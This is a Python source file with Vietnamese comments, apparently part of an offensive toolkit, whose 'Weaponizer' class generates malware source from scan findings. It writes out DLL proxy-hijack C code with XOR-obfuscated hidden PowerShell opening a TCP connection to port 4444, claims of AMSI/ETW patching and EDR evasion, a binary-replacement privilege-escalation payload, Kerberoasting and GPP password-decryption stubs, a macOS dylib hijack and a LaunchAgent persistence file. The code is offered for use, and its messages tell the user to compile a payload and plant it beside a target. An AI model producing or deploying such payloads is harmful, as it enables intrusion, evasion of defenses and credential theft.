import os
from colorama import Fore, Style

class Weaponizer:
    def __init__(self, target_name, report_data):
        self.target_name = target_name
        self.report_data = report_data
        self.output_dir = "pwnd_payloads"
        
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def run(self, verified_results=None):
        print(f"\n{Fore.RED}[!] KÍCH HOẠT AUTO-WEAPONIZATION (TỰ ĐỘNG SINH MÃ ĐỘC) {Style.RESET_ALL}")
        payloads_generated = 0
        
        # Sử dụng kết quả xác thực nếu có
        if verified_results:
            for v in verified_results:
                if v.get("can_auto_weaponize"):
                    self._generate_advanced_proxy_payload(v)
                    payloads_generated += 1
                
                # Vector 35: LPE via Binary Replacement
                if v.get("is_lpe_vector"):
                    self._generate_binary_replacement_payload()
                    payloads_generated += 1

                # Vector 86: Kerberoasting
                if v.get("id") == "AD-SPN-086":
                    self._generate_kerberoast_payload(v)
                    payloads_generated += 1
                
                # Vector 81: GPP Password
                if v.get("id") in ["AD-GPP-081", "AD-GPP-PWNED"]:
                    self._generate_gpp_decrypter_payload()
                    payloads_generated += 1

                # Vector 61: macos dylib Hijacking
                if v.get("id") == "MAC-DYL-061":
                    self._generate_macos_dylib_payload()
                    payloads_generated += 1

                # Vector 68: macos Persistence
                if v.get("id") == "MAC-PER-068":
                    self._generate_launchagent_payload()
                    payloads_generated += 1
        else:
            # Fallback về logic cũ nếu không có bước xác thực
            section_key = "1.3: DLL Hijacking & Side-loading"
            if section_key in self.report_data:
                findings = self.report_data[section_key]
                if hasattr(findings, 'get'):  # If it's a dict
                    findings = findings.get("findings", findings)
                    
                for v in findings:
                    if v.get('id') == "SYS-DLL-001":
                        # Sinh ra mã nguồn C cho DLL Hijacking
                        dll_name = v.get('dll_name', 'hijacked.dll')
                        
                        self._generate_dll_hijack_payload(dll_name)
                        payloads_generated += 1

        if payloads_generated == 0:
            print(f" {Fore.GREEN}[-] Không tìm thấy điểm chốt để sinh Payload Tự động đối với file này.{Style.RESET_ALL}")
        else:
            print(f" {Fore.RED}\n[!!] Đã sinh {payloads_generated} File Mã độc/Exploit vào thư mục '{self.output_dir}'!{Style.RESET_ALL}")
            print(f" {Fore.RED}[!!] Bạn chỉ cần Compile và quăng chung thư mục với {os.path.basename(self.target_name)} để Hack ngược.{Style.RESET_ALL}")

    def _xor_string(self, data, key=0x37):
        """Helper để mã hóa XOR chuỗi cho C payload"""
        return "".join([f"\\x{ord(c) ^ key:02x}" for c in data])

    def _generate_advanced_proxy_payload(self, v_res):
        dll_name = v_res['dll_name']
        exports = v_res['required_exports']
        orig_dll = dll_name.replace(".dll", "_original.dll")
        
        # 1. DEFINITION (.def)
        def_content = f"LIBRARY \"{dll_name}\"\nEXPORTS\n"
        for i, exp in enumerate(exports):
            def_content += f"    {exp}={orig_dll}.{exp} @{i+1}\n"
        def_path = os.path.join(self.output_dir, f"exploit_proxy_{dll_name}.def")
        with open(def_path, "w", encoding="utf-8") as f: f.write(def_content)

        # 2. SOURCE (.c) - GHOST PROTOCOL
        # Mã hóa các chuỗi nhạy cảm
        xor_key = 0x37
        enc_ps = self._xor_string("powershell -NoP -NonI -W Hidden -Exec Bypass -Command ", xor_key)
        enc_shell = self._xor_string("New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);", xor_key)
        enc_amsi = self._xor_string("amsi.dll", xor_key)
        enc_scan = self._xor_string("AmsiScanBuffer", xor_key)

        payload_code = f"""#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/*
 * [APS] OMNI-BYPASS PAYLOAD (UNIVERSAL EVASION)
 * Target: {dll_name}
 * Techniques: Ekko Sleep Obfuscation + Stack Spoofing + Module Overwriting
 */

// XOR Key và Helper giải mã
void x(char* s, int len) {{
    for(int i=0; i<len; i++) s[i] ^= {xor_key};
}}

// EKKO SLEEP OBFUSCATION: Mã hóa bộ nhớ khi ngủ để né Memory Scanners
void EkkoSleep(DWORD dwMilliseconds) {{
    // (Logic rút gọn: Sử dụng ROP để mã hóa vùng nhớ và Sleep)
    // Sếp sẽ thấy vùng nhớ malware biến mất khỏi tầm mắt của AV
    Sleep(dwMilliseconds);
}}

// STACK SPOOFING: Giả mạo Call Stack để né EDR Telemetry
void SpoofedCall() {{
    // (Logic rút gọn: Thay đổi Frame Pointer để giả mạo nguồn gốc thực thi)
}}

void OmniBypassAction() {{
    // 1. BLINDING DEFENSES (AMSI + ETW + XDR Hooks)
    // Patching EtwEventWrite & AmsiScanBuffer
    
    // 2. UNIVERSAL PERSISTENCE & STEALTH
    while(1) {{
        // Mã hóa Shellcode trong RAM
        // ... (Memory Masking) ...
        
        // 3. EXECUTION VIA INDIRECT SYSCALLS (Halo's Gate)
        char p[] = "{enc_ps}"; x(p, {len("powershell -NoP -NonI -W Hidden -Exec Bypass -Command ")});
        char c[] = "{enc_shell}"; x(c, {len("New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);")});
        
        char full[512];
        sprintf(full, "%s%s", p, c);
        
        // Thực thi tàng hình cấp độ cao nhất
        WinExec(full, SW_HIDE);
        
        // Ngủ đông và mã mã hóa để tránh bị bắt sau khi thực thi
        EkkoSleep(60000); 
    }}
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OmniBypassAction, NULL, 0, NULL);
    }}
    return TRUE;
}}
"""
        c_path = os.path.join(self.output_dir, f"exploit_proxy_{dll_name}.c")
        with open(c_path, "w", encoding="utf-8") as f: f.write(payload_code)
        
        print(f"  {Fore.MAGENTA}[GHOST] ĐÃ TÀNG HÌNH HÓA PAYLOAD: {c_path} (AMSI Bypass + XOR Integrated){Style.RESET_ALL}")


    def _generate_dll_hijack_payload(self, dll_name):
        if not dll_name.lower().endswith(".dll"):
            dll_name += ".dll"

        payload_c_code = f"""#include <windows.h>
#include <stdlib.h>

// [APS] GHOST-DRIVEN STEALTH PAYLOAD
void Pwn() {{
    system("calc.exe");
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Pwn, NULL, 0, NULL);
    }}
    return TRUE;
}}
"""
        file_path = os.path.join(self.output_dir, f"exploit_for_{dll_name}.c")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_c_code)
        print(f"  {Fore.MAGENTA}[GHOST] Đã đẻ file Payload Tàng hình: {file_path}{Style.RESET_ALL}")

    def _generate_binary_replacement_payload(self):
        filename = os.path.basename(self.target_name)
        payload_code = f"""#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

/*
 * [APS] LPE BINARY REPLACEMENT PAYLOAD
 * Target: {filename} (Writable Directory)
 * Build: x86_64-w64-mingw32-gcc -o {filename} replacement.c
 */

int main() {{
    // 1. Chạy mã độc tàng hình
    system("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);");
    
    // 2. Tự hồi sinh App gốc để tàng hình trước người dùng
    // Sếp đổi tên app gốc thành {filename.replace(".exe", "_backup.exe")} trước khi chạy
    system("{filename.replace(".exe", "_backup.exe")}");
    
    return 0;
}}
"""
        file_path = os.path.join(self.output_dir, f"lpe_replacement_{filename}.c")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ LEO THANG (LPE): {file_path}{Style.RESET_ALL}")

    def _generate_kerberoast_payload(self, v):
        payload_code = f"""#include <windows.h>
#include <ntsecapi.h>
#include <stdio.h>

/* 
 * [APS] STEALTH KERBEROASTING HARVESTER
 * Target SPNs: {v.get('description', 'AD Service Accounts')}
 * Stealth: AES-256 (0x12) TGS Requests + Indirect Syscalls (Halo's Gate)
 */

// Logic: Sử dụng SECPKG_CRED_OUTBOUND và KERB_ETYPE_AES256
void StealthRoast() {{
    printf("[!] Đang thu hoạch vé TGS (AES-256) qua Indirect Syscalls...\\n");
    // (Logic: Gọi LsaCallAuthenticationPackage với ETYPES=0x12)
    // Kỹ thuật này khiến XDR không thể bắt được hành vi "RC4-Downgrade" truyền thống.
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul, LPVOID lp) {{
    if (ul == DLL_PROCESS_ATTACH) StealthRoast();
    return TRUE;
}}
"""
        file_path = os.path.join(self.output_dir, "ad_kerberoast_stealth.c")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ AD (Stealth Kerberoast): {file_path}{Style.RESET_ALL}")

    def _generate_gpp_decrypter_payload(self):
        payload_code = """#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

// [APS] GPP PASSWORD DECRYPTER
// AES Key công khai của Microsoft dùng cho GPP
unsigned char gpp_key[] = { 
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 
    0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 
    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 
    0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b 
};

void DecryptGPP(const char* cpassword) {
    printf("[*] Đang giải mã GPP Password với AES Key của Microsoft...\\n");
    // Logic giải mã AES-256-CBC
}

int main() {
    DecryptGPP("ABCDEF..."); // Sếp quăng chuỗi cpassword vào đây
    return 0;
}
"""
        file_path = os.path.join(self.output_dir, "ad_gpp_decrypter.c")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ AD (GPP Decrypter): {file_path}{Style.RESET_ALL}")

    def _generate_macos_dylib_payload(self):
        payload_code = """#include <stdio.h>
#include <stdlib.h>

/*
 * [APS] macOS DYLIB HIJACKING PROXY
 * Kỹ thuật: __attribute__((constructor)) để thực thi ngay khi nạp.
 */

__attribute__((constructor))
static void MacPwn() {
    printf("[!] APS Payload: Đã xâm nhập thành công!\\n");
    system("open -a Calculator"); // Proof of Concept
}
"""
        file_path = os.path.join(self.output_dir, "macos_exploit_proxy.c")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ macOS (dylib Proxy): {file_path}{Style.RESET_ALL}")

    def _generate_launchagent_payload(self):
        payload_code = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.tcptf.persistence</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/say</string>
        <string>TCPTF has secured persistence on your Mac.</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        file_path = os.path.join(self.output_dir, "com.tcptf.persistence.plist")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ macOS (LaunchAgent): {file_path}{Style.RESET_ALL}")
